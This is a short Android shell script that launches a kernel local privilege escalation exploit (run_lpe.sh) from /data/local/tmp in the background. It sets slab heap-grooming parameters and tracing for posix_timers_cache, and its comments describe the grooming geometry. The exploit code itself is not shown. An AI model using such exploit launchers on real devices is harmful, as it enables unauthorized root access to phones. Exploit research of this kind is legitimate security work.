#!/system/bin/sh
# run7: same shield geometry as run6, plus IC_SLABTRACE so the attempt itself
# timestamps posix_timers_cache at every reclaim step.  No external slabinfo
# poller this time: the exploit's fd is opened before the padding geometry
# exists, so its reads cannot split the order-1 block under test.
cd /data/local/tmp || exit 1
rm -f ic-run8.log
IC_SLABTRACE=1 \
IC_PAD_SKIP=15 IC_PAD_KEEP=31 IC_FLUSH_DEL=16 IC_FLUSH_SPARSE=15 \
  ATTEMPTS=1 nohup sh /data/local/tmp/run_lpe.sh > /data/local/tmp/ic-run8.log 2>&1 &
exit 0
